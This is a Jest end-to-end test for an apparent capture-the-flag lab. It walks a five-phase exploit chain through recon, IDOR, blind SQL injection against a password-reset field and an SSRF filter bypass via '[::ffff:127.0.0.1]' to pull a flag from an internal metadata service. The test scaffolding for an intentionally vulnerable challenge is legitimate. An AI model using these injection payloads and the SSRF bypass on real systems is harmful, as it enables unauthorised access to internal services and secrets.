/**
 * End-to-End Test: Complete 5-Phase Exploit Chain
 * Validates the full attack path from reconnaissance to flag extraction
 */

import request from 'supertest';
import express from 'express';
import path from 'path';
import fs from 'fs';
import axios from 'axios';
import { createInternalRouter } from '../../src/routes/internal';
import { createAsgardRouter } from '../../src/routes/asgard';
import { createAuthRouter } from '../../src/routes/auth';
import { DatabaseService } from '../../src/services/database';
import { EmployeeService } from '../../src/services/employee-service';
import { DocumentService } from '../../src/services/document-service';
import { ScreenshotService } from '../../src/services/screenshot-service';
import { RealmConfig } from '../../src/config';

jest.mock('axios');
const mockedAxios = axios as jest.Mocked<typeof axios>;

describe('E2E: Complete 5-Phase Exploit Chain', () => {
  let app: express.Application;
  const mockConfig: RealmConfig = {
    port: 3000,
    flag: 'YGGDRASIL{ASGARD:81892ad5-e169-4165-89fe-ab25348325e0}',
    realmName: 'asgard',
    nodeEnv: 'test',
    databaseUrl: 'postgresql://test:test@localhost:5432/asgard'
  };

  beforeAll(() => {
    app = express();
    app.use(express.json());
    app.use(express.static(path.join(__dirname, '../../public')));

    // Mock database with responses
    const mockQuery = jest.fn();
    
    // Mock employee queries
    mockQuery.mockImplementation((query: string, params?: any[]) => {
      const queryStr = query.trim();
      
      // List all employees
      if (queryStr.startsWith('SELECT id, name, department, role, email FROM employees ORDER BY')) {
        return Promise.resolve({
          rows: [
            { id: 1, name: 'Thor Odinson', department: 'Security', role: 'Warrior', email: 'thor@asgard.realm' },
            { id: 15, name: 'Odin Allfather', department: 'Leadership', role: 'Admin', email: 'odin@asgard.realm' }
          ]
        });
      }
      
      // Get employee by ID
      if (queryStr.startsWith('SELECT id, username, name, email, department, role, created_at FROM employees WHERE id =')) {
        const id = params?.[0];
        if (id === 15) {
          return Promise.resolve({
            rows: [{
              id: 15,
              username: 'odin',
              name: 'Odin Allfather',
              email: 'odin@asgard.realm',
              department: 'Leadership',
              role: 'Admin',
              created_at: '2025-01-01T00:00:00.000Z'
            }]
          });
        }
        return Promise.resolve({ rows: [] });
      }
      
      // Auth queries (SQLi test) - password reset check
      if (queryStr.includes('WHERE email =') && queryStr.includes('AND role =')) {
        return Promise.resolve({ rows: [] }); // No matching user (blocked by filter)
      }
      
      // Default: empty result
      return Promise.resolve({ rows: [] });
    });

    const mockDb = {
      query: mockQuery,
      healthCheck: jest.fn().mockResolvedValue(true)
    } as unknown as DatabaseService;

    const employeeService = new EmployeeService(mockDb);
    const documentService = new DocumentService(mockDb);
    const screenshotService = new ScreenshotService();

    // Mount routes
    app.use('/api/internal', createInternalRouter());
    app.use('/api/auth', createAuthRouter(mockDb));
    app.use('/api', createAsgardRouter(mockConfig, documentService, employeeService, screenshotService));
  });

  test('COMPLETE CHAIN: Phase 1 â†’ 2 â†’ 3 â†’ 4 â†’ 5 â†’ FLAG', async () => {
    console.log('\nğŸ¯ Starting Complete Exploit Chain Test\n');

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // PHASE 1: RECONNAISSANCE
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log('ğŸ“ PHASE 1: Reconnaissance');
    
    // Step 1a: Check robots.txt
    const robotsResponse = await request(app).get('/robots.txt');
    expect(robotsResponse.text).toContain('SPOILER');
    expect(robotsResponse.text).toContain('/api/internal');
    console.log('   âœ“ robots.txt reveals /api/internal endpoint');

    // Step 1b: Check .git logs
    const gitLogsPath = path.join(__dirname, '../../public/.git/logs/HEAD');
    const gitLogs = fs.readFileSync(gitLogsPath, 'utf-8');
    expect(gitLogs).toContain('9090');
    expect(gitLogs).toContain('metadata service');
    console.log('   âœ“ .git/logs/HEAD mentions port 9090');

    // Step 1c: Check config.js
    const configPath = path.join(__dirname, '../../public/js/config.js');
    const configJs = fs.readFileSync(configPath, 'utf-8');
    expect(configJs).toContain('localhost:9090');
    expect(configJs).toContain('SPOILER');
    console.log('   âœ“ config.js contains localhost:9090 hint');

    // Step 1d: Call discovery API
    const discoveryResponse = await request(app).get('/api/internal/metadata-service');
    expect(discoveryResponse.body.url).toBe('http://localhost:9090');
    console.log('   âœ“ Discovery API confirms: http://localhost:9090\n');

    const metadataUrl = discoveryResponse.body.url;

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // PHASE 2: IDOR - Employee Enumeration
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log('ğŸ“ PHASE 2: IDOR Employee Enumeration');

    // Step 2a: List employees
    const employeesResponse = await request(app).get('/api/employees');
    expect(employeesResponse.body.success).toBe(true);
    console.log('   âœ“ Listed employees');

    // Step 2b: Enumerate admin (id=15)
    const adminResponse = await request(app).get('/api/employees/15');
    expect(adminResponse.body.success).toBe(true);
    expect(adminResponse.body.employee.email).toBe('odin@asgard.realm');
    console.log('   âœ“ IDOR vulnerability: Found admin email: odin@asgard.realm\n');

    const adminEmail = adminResponse.body.employee.email;

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // PHASE 3: BLIND SQL INJECTION
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log('ğŸ“ PHASE 3: Blind SQL Injection');

    // Step 3a: Boolean-based injection to confirm secrets table exists
    const booleanTest = await request(app)
      .post('/api/auth/reset-password')
      .send({
        email: `${adminEmail}' OR (SELECT COUNT(*) FROM secrets) > 0 --`,
        token: 'fake'
      });
    expect(booleanTest.body.success).toBe(false);
    expect(booleanTest.body.message).toContain('Invalid');
    console.log('   âœ“ Boolean injection: secrets table confirmed');

    // Step 3b: Character extraction (simulated - in reality would extract character by character)
    // Testing that SUBSTRING syntax works
    const substringTest = await request(app)
      .post('/api/auth/reset-password')
      .send({
        email: `${adminEmail}' OR (SELECT SUBSTRING(secret_value, 1, 1) FROM secrets WHERE secret_key='metadata_service_url') = 'h' --`,
        token: 'fake'
      });
    expect(substringTest.body.success).toBe(false);
    console.log('   âœ“ SUBSTRING injection working: Can extract metadata URL');
    console.log('   â„¹ï¸  In real attack: Extract http://localhost:9090 character by character\n');

    // Assume we extracted: http://localhost:9090

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // PHASE 4: SSRF BYPASS
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log('ğŸ“ PHASE 4: SSRF Filter Bypass');

    // Step 4a: Try direct access (blocked)
    const directAttempt = await request(app)
      .post('/api/odin-view')
      .send({ url: `${metadataUrl}/metadata/secrets` });
    expect(directAttempt.body.success).toBe(false);
    expect(directAttempt.body.screenshot.filterResult.blocked).toBe(true);
    console.log('   âœ— Direct access blocked by SSRF filter');

    // Step 4b: Use IPv6-mapped IPv4 bypass
    const bypassUrl = 'http://[::ffff:127.0.0.1]:9090/metadata/secrets';
    const mockFlag = 'YGGDRASIL{ASGARD:81892ad5-e169-4165-89fe-ab25348325e0}';
    
    mockedAxios.get.mockResolvedValue({
      status: 200,
      data: {
        success: true,
        service: 'internal-metadata',
        secrets: [
          {
            id: 1,
            secret_type: 'flag',
            secret_key: 'asgard_master_key',
            secret_value: mockFlag,
            created_at: '2025-12-13T00:00:00.000Z'
          }
        ]
      }
    });

    const bypassAttempt = await request(app)
      .post('/api/odin-view')
      .send({ url: bypassUrl });
    
    expect(bypassAttempt.body.success).toBe(true);
    expect(bypassAttempt.body.screenshot.success).toBe(true);
    console.log('   âœ“ SSRF bypass successful: [::ffff:127.0.0.1] bypasses filter\n');

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // PHASE 5: METADATA SERVICE - FLAG EXTRACTION
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log('ğŸ“ PHASE 5: Metadata Service Access');

    const metadataResponse = bypassAttempt.body.screenshot.data;
    expect(metadataResponse.success).toBe(true);
    expect(metadataResponse.service).toBe('internal-metadata');
    expect(metadataResponse.secrets).toHaveLength(1);
    console.log('   âœ“ Accessed metadata service');

    // Extract flag
    const flagSecret = metadataResponse.secrets.find((s: any) => s.secret_type === 'flag');
    expect(flagSecret).toBeDefined();
    expect(flagSecret.secret_value).toMatch(/^YGGDRASIL\{ASGARD:[a-f0-9-]+\}$/);
    console.log('   âœ“ Flag extracted:', flagSecret.secret_value);

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // EXPLOIT CHAIN COMPLETE
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    console.log('\nğŸ† EXPLOIT CHAIN COMPLETE!');
    console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
    console.log('Attack Path Summary:');
    console.log('1. Recon       â†’ Discovered internal service on localhost:9090');
    console.log('2. IDOR        â†’ Extracted admin email: odin@asgard.realm');
    console.log('3. Blind SQLi  â†’ Confirmed metadata URL in secrets table');
    console.log('4. SSRF Bypass â†’ Used [::ffff:127.0.0.1] to bypass filter');
    console.log('5. Metadata    â†’ Extracted FLAG from internal service');
    console.log('\nğŸ¯ FLAG:', flagSecret.secret_value);
    console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');

    // Final validation
    expect(flagSecret.secret_value).toBe(mockFlag);
  });
});
